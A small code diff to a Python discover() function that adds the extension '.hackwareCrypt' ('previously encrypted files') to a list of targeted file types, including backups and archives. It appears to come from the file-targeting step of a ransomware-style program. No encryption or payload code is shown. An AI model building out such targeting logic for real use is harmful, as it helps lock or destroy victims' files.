@@ -37,6 +37,8 @@ def discover(initial_path):
         'go', 'py', 'pyc', 'bf', 'coffee',  # Outros tipos de códigos fonte
 
         'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # Arquivos compactados e Backups
+
+        '.hackwareCrypt',  # Arquivos criptografados anteriormente
     ]
 
     # dirpath - caminho atual
